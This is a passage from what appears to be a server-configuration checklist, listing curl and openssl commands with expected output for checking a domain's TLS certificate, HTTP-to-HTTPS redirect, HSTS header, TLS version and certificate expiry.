  $ curl -vI https://anihpj.com 2>&1 | grep -E 'Server certificate|HTTP/'
  → HTTP/2 200
  → Server certificate: subject=CN=anihpj.com, issuer=C=US,O=Let's Encrypt

  # 2. Verify HTTP→HTTPS redirect works
  $ curl -vI http://anihpj.com 2>&1 | grep -E 'Location|HTTP/'
  → HTTP/1.1 308 Permanent Redirect
  → Location: https://anihpj.com/

  # 3. Verify HSTS header is present
  $ curl -sI https://anihpj.com | grep Strict-Transport
  → Strict-Transport-Security: max-age=31536000; includeSubDomains

  # 4. Verify TLS version (1.2+ only)
  $ openssl s_client -connect anihpj.com:443 -tls1_2 < /dev/null 2>&1 | grep Verify
  → Verify return code: 0 (ok) — TLS 1.2 works
  $ openssl s_client -connect anihpj.com:443 -tls1_1 < /dev/null 2>&1 | grep Verify
  → (should fail or return error — TLS 1.1 is blocked)

  # 5. Check certificate expiry date
  $ echo | openssl s_client -connect anihpj.com:443 2>/dev/null | \
      openssl x509 -noout -dates
  → notBefore=Jan 1 00:00:00 2024 GMT
  → notAfter=Apr 1 00:00:00 2024 GMT
